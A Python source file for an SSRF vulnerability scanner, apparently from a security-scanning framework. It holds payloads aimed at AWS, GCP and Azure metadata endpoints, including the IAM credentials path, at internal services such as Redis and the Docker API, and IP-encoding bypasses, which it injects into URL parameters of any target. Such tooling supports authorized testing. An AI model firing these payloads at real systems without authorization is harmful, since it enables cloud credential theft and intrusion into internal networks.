"""SSRF — Server-Side Request Forgery vulnerability scanner.

SSRF allows attackers to make the server perform requests to internal
services, cloud metadata endpoints, or arbitrary external URLs.
Critical in cloud environments (AWS/GCP/Azure metadata exposure).

Manual-only scanner — no standard binary tool covers SSRF generically.
"""

from __future__ import annotations

import asyncio
import re
from typing import Any
from urllib.parse import urlparse, parse_qs

import httpx
import structlog

from src.adapters.scanners.base import BaseOsintScanner
from src.core.domain.entities.types import ScanInputType

log = structlog.get_logger()

# SSRF probe payloads targeting internal services and cloud metadata
_SSRF_PAYLOADS: list[tuple[str, str, str]] = [
    # (payload, target_description, detection_pattern)
    # Cloud metadata endpoints
    ("http://169.254.169.254/latest/meta-data/", "aws_metadata", r"ami-id|instance-id|placement|security-groups"),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "aws_credentials", r"(?i)AccessKeyId|SecretAccessKey|Token"),
    ("http://metadata.google.internal/computeMetadata/v1/", "gcp_metadata", r"(?i)project|zone|instance"),
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "azure_metadata", r"(?i)azEnvironment|subscriptionId|resourceGroupName"),
    # Internal network probing
    ("http://localhost/", "localhost", r"(?i)(server|localhost|127\.0\.0\.1|internal)"),
    ("http://127.0.0.1/", "loopback", r"(?i)(server|localhost|127\.0\.0\.1)"),
    ("http://0.0.0.0/", "zero_addr", r"(?i)(server|localhost|0\.0\.0\.0)"),
    ("http://[::1]/", "ipv6_loopback", r"(?i)(server|localhost)"),
    # Internal services
    ("http://localhost:6379/", "redis", r"(?i)WRONGTYPE|NOAUTH|redis|ERR"),
    ("http://localhost:27017/", "mongodb", r"(?i)mongodb|It looks like you are trying"),
    ("http://localhost:5432/", "postgresql", r"(?i)postgresql|pg_"),
    ("http://localhost:8500/v1/agent/self", "consul", r"(?i)consul|datacenter|NodeName"),
    ("http://localhost:2375/version", "docker_api", r"(?i)ApiVersion|docker|Os"),
    ("http://localhost:10255/pods", "k8s_kubelet", r"(?i)kubernetes|pods|namespace"),
]

# Parameters commonly used for URL/host inputs (SSRF vectors)
_SSRF_PARAMS: list[str] = [
    "url", "uri", "link", "src", "source", "href",
    "redirect", "next", "return", "return_url", "returnTo",
    "callback", "cb", "webhook", "webhook_url",
    "proxy", "proxy_url", "forward",
    "image", "img", "avatar", "picture", "photo",
    "file", "path", "document", "resource",
    "feed", "rss", "atom", "sitemap",
    "host", "server", "endpoint", "service",
    "fetch", "load", "download", "import",
    "target", "dest", "destination",
]

# URL scheme bypass techniques
_BYPASS_SCHEMES: list[str] = [
    "http://169.254.169.254/",
    "http://[169.254.169.254]/",
    "http://0251.0376.0251.0376/",  # Octal encoding of 169.254.169.254
    "http://2852039166/",            # Decimal encoding of 169.254.169.254
    "http://0xa9fea9fe/",            # Hex encoding
]


class SSRFScanner(BaseOsintScanner):
    """Server-Side Request Forgery (SSRF) vulnerability scanner.

    Tests web parameters that accept URLs/hosts for SSRF vulnerabilities.
    Detects access to cloud metadata endpoints (AWS/GCP/Azure), internal
    services (Redis, MongoDB, Docker API, Kubernetes), and localhost.
    """

    scanner_name = "ssrf"
    supported_input_types = frozenset({ScanInputType.DOMAIN, ScanInputType.URL})
    cache_ttl = 1800
    scan_timeout = 90

    async def _do_scan(self, input_value: str, input_type: ScanInputType) -> dict[str, Any]:
        base_url = _normalise_url(input_value, input_type)
        return await self._manual_scan(base_url, input_value)

    async def _manual_scan(self, base_url: str, input_value: str) -> dict[str, Any]:
        vulnerabilities: list[dict[str, Any]] = []
        identifiers: list[str] = []

        parsed = urlparse(base_url)
        existing_params = list(parse_qs(parsed.query).keys())
        base_clean = base_url.split("?")[0]
        test_params = list(dict.fromkeys(existing_params + _SSRF_PARAMS[:10]))

        async with httpx.AsyncClient(
            timeout=8,
            follow_redirects=True,
            verify=False,
            headers={"User-Agent": "Mozilla/5.0 (compatible; SSRFScanner/1.0)"},
        ) as client:
            semaphore = asyncio.Semaphore(8)

            async def test_param_with_payload(param: str, payload: str, target_desc: str, pattern: str) -> None:
                async with semaphore:
                    try:
                        # GET parameter injection
                        test_url = f"{base_clean}?{param}={payload}"
                        resp = await client.get(test_url)
                        body = resp.text

                        if re.search(pattern, body, re.I):
                            vuln = {
                                "parameter": param,
                                "payload": payload,
                                "target": target_desc,
                                "method": "GET",
                                "severity": "critical" if "metadata" in target_desc or "credentials" in target_desc else "high",
                                "evidence": re.search(pattern, body, re.I).group(0)[:80] if re.search(pattern, body, re.I) else "",
                                "description": f"SSRF: server fetched {target_desc} via {param} parameter",
                            }
                            vulnerabilities.append(vuln)
                            ident = f"vuln:ssrf:{param}:{target_desc}"
                            if ident not in identifiers:
                                identifiers.append(ident)
                    except Exception:
                        pass

            async def test_post_param(param: str, payload: str, target_desc: str, pattern: str) -> None:
                async with semaphore:
                    try:
                        resp = await client.post(base_clean, data={param: payload})
                        if re.search(pattern, resp.text, re.I):
                            vuln = {
                                "parameter": param,
                                "payload": payload,
                                "target": target_desc,
                                "method": "POST",
                                "severity": "critical" if "metadata" in target_desc else "high",
                                "description": f"SSRF via POST: {param} → {target_desc}",
                            }
                            vulnerabilities.append(vuln)
                            ident = f"vuln:ssrf:post:{param}"
                            if ident not in identifiers:
                                identifiers.append(ident)
                    except Exception:
                        pass

            # Test every param × every SSRF payload
            tasks = []
            for param in test_params:
                for payload, target_desc, pattern in _SSRF_PAYLOADS[:6]:  # Top 6 most critical
                    tasks.append(test_param_with_payload(param, payload, target_desc, pattern))
                    tasks.append(test_post_param(param, payload, target_desc, pattern))

            await asyncio.gather(*tasks)

            # Test bypass techniques for the most promising params
            bypass_tasks = []
            for param in test_params[:5]:
                for bypass_url in _BYPASS_SCHEMES:
                    bypass_tasks.append(
                        test_param_with_payload(param, bypass_url, "aws_metadata_bypass", r"ami-id|instance-id")
                    )
            await asyncio.gather(*bypass_tasks)

        severity_counts: dict[str, int] = {}
        for v in vulnerabilities:
            s = v.get("severity", "high")
            severity_counts[s] = severity_counts.get(s, 0) + 1

        return {
            "input": input_value,
            "scan_mode": "manual_fallback",
            "base_url": base_url,
            "vulnerabilities": vulnerabilities,
            "total_found": len(vulnerabilities),
            "params_tested": test_params,
            "severity_summary": severity_counts,
            "cloud_metadata_exposed": any("metadata" in v.get("target", "") for v in vulnerabilities),
            "extracted_identifiers": identifiers,
        }

    def _extract_identifiers(self, raw_data: dict[str, Any]) -> list[str]:
        return raw_data.get("extracted_identifiers", [])


def _normalise_url(value: str, input_type: ScanInputType) -> str:
    if input_type == ScanInputType.DOMAIN:
        return f"https://{value}"
    if not value.startswith(("http://", "https://")):
        return f"https://{value}"
    return value
